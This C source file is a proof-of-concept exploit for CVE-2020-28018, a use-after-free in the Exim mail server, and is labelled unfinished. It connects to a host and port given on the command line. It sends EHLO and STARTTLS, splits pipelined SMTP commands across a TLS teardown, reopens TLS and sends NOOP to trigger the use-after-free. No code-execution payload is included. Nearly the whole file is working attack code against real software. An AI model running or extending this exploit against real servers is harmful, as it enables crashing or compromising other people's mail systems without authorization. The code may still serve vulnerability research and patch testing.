/*

    CVE-2020-28018 PoC: Exim Use-After-Free leading to Remote Code Execution

	- @lockedbyte -
	

      --- STILL NOT FINISHED ---

*/


#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <malloc.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <resolv.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define DEBUG 1
#define DELAY_TIME 0.5
#define FAIL -1

#define MAX_PIPLN_SZ 2048*2048

#define CLEARTEXT_T 0
#define TLS_T 1

SSL_CTX *ctx = NULL;

/* commands */

#define EHLO_CMD "EHLO pwner\r\n"
#define STARTTLS_CMD "STARTTLS\r\n"
#define PIPLN_01_CMD "MAIL FROM:<>\nNO"
#define PIPLN_02_CMD "OP\r\n"

int remote_conn(const char *hostname, int port) {
    int sd = 0;
    struct hostent *host;
    struct sockaddr_in addr;
    if((host = gethostbyname(hostname)) == NULL) {
        puts("[-] Something went wrong resolving target hostname");
        exit(0);
    }
    sd = socket(PF_INET, SOCK_STREAM, 0);
    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = *(long*)(host->h_addr);
    if(connect(sd, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        close(sd);
	puts("[-] Something went wrong connecting to target");
	exit(0);
    }
    return sd;
}

SSL_CTX *init_ctx_x(void) {
    SSL_METHOD *method = NULL;
    SSL_CTX *ctx = NULL;
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    method = TLSv1_2_client_method();
    ctx = SSL_CTX_new(method);
    if (ctx == NULL) {
        ERR_print_errors_fp(stderr);
        abort();
    }
    return ctx;
}


void show_certs(SSL* ssl) {
    X509 *cert = NULL;
    char *line = NULL;
    cert = SSL_get_peer_certificate(ssl);
    if (cert != NULL) {
        printf("[+] Server certificates:\n");
        line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
        printf("\t[i] Subject: %s\n", line);
        free(line);
        line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
        printf("\t[i] Issuer: %s\n", line);
        free(line);
        X509_free(cert);
    } else
        printf("Info: No client certificates configured.\n");
    return;
}

SSL *initialize_enc_channel(int fd) {
	SSL *ssl = NULL;
	SSL_library_init();
	ctx = init_ctx_x();
	ssl = SSL_new(ctx);
	SSL_set_fd(ssl, fd);
	if(SSL_connect(ssl) == FAIL) {
		ERR_print_errors_fp(stderr);
		perror("SSL_connect");
		exit(1);
	}
	return ssl;
}


int send_data(long fd, char *buf, size_t size, int method_t) {
	int ret = 0;
	switch(method_t) {
		case CLEARTEXT_T:
			ret = write(fd, buf, size);
			break;
		case TLS_T:
			ret = SSL_write((SSL *)fd, buf, size);
			break;
		default:
			puts("[-] Unknown error ocurred.");
			exit(1);
	}
	return ret;
}

int recv_data(long fd, char *buf, size_t size, int method_t) {
	int ret = 0;
	switch(method_t) {
		case CLEARTEXT_T:
			ret = read(fd, buf, size);
			break;
		case TLS_T:
			ret = SSL_read((SSL *)fd, buf, size);
			break;
		default:
			puts("[-] Unknown error ocurred.");
			exit(1);
	}
	return ret;
}

void reinit_mem(char *buf, size_t size, char *str) {
	memset(buf, '\0', size);
	strncpy(buf, str, size);
	buf[size-1] = '\0';
	return;
}

void exchange_data(long fd, char *buf, size_t size, int send_flg, int recv_flg, int method_t) {
	if(send_flg) {
	        #if DEBUG
	        	printf("[DEBUG] Sending: %s\n", buf);
	        #endif
		send_data(fd, buf, strlen(buf), method_t);
	}
	sleep(DELAY_TIME);
	if(recv_flg) {
		recv_data(fd, buf, size, method_t);
		buf[size-1] = '\0';
		#if DEBUG
			printf("%s", buf);
		#endif
	}
	sleep(DELAY_TIME);
	return;
}

void close_tls_channel(SSL *ssl) {
	SSL_shutdown(ssl);
	SSL_free(ssl);
	return;
}

int main(int argc, char *argv[]) {
	long fd = 0;
	SSL *ssl = NULL;
	int count = 0;
	int TARGET_PORT = 0;
	char buf[4096];
	char TARGET_HOST[256];
	int i = 0;
	memset(buf, '\0', sizeof(buf));
	memset(TARGET_HOST, '\0', sizeof(TARGET_HOST));
	
	puts("[i] CVE-2020-28018 Proof-Of-Concept (PoC) exploit");

	if(argc < 3) {
		printf("Usage: %s <target host> <target port>\n", argv[0]);
		exit(0);
	}
	
	TARGET_PORT = atoi(argv[2]);
	
	snprintf(TARGET_HOST, sizeof(TARGET_HOST)-1, "%s", argv[1]);
	
	printf("[+] Connecting to %s:%d\n", TARGET_HOST, TARGET_PORT);
	
	fd = remote_conn(TARGET_HOST, TARGET_PORT);
	
	exchange_data(fd, buf, sizeof(buf)-1, 0, 1, CLEARTEXT_T);
	
	puts("[*] Sending EHLO...");
	reinit_mem(buf, sizeof(buf), EHLO_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	puts("[*] Initializing an encrypted TLS channel...");
	reinit_mem(buf, sizeof(buf), STARTTLS_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	ssl = initialize_enc_channel(fd);

	printf("[+] Initialized encrypted channel with %s:%d (%s)\n", TARGET_HOST, TARGET_PORT, SSL_get_cipher(ssl));
	show_certs(ssl);
	
	puts("[*] Sending EHLO...");
	reinit_mem(buf, sizeof(buf), EHLO_CMD);
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 1, TLS_T);
	
	puts("[*] Sending pipelined command (1)...");
	
	reinit_mem(buf, sizeof(buf), PIPLN_01_CMD);
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 0, TLS_T);

	puts("[*] Closing TLS connection channel...");
	close_tls_channel(ssl);
	
	ssl = NULL;
	
	puts("[*] Sending pipelined command (2)...");
	reinit_mem(buf, sizeof(buf), PIPLN_02_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
		
	puts("[*] Sending EHLO...");
	
	reinit_mem(buf, sizeof(buf), EHLO_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);

	puts("[*] Re-initializing an encrypted TLS channel...");
	
	reinit_mem(buf, sizeof(buf), STARTTLS_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	ssl = initialize_enc_channel(fd);
	printf("[+] Initialized encrypted channel with %s:%d (%s)\n", TARGET_HOST, TARGET_PORT, SSL_get_cipher(ssl));
	show_certs(ssl);
	
	puts("[*] Triggering Use-After-Free...");

	reinit_mem(buf, sizeof(buf), "NOOP\r\n");
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 1, TLS_T);
	
	if(ssl) {
		SSL_free(ssl);
		ssl = NULL;
	}
	if(ctx) {
		SSL_CTX_free(ctx);
		ctx = NULL;
	}
	close(fd);

	puts("[+] Exploit completed!");

	return 0;
}
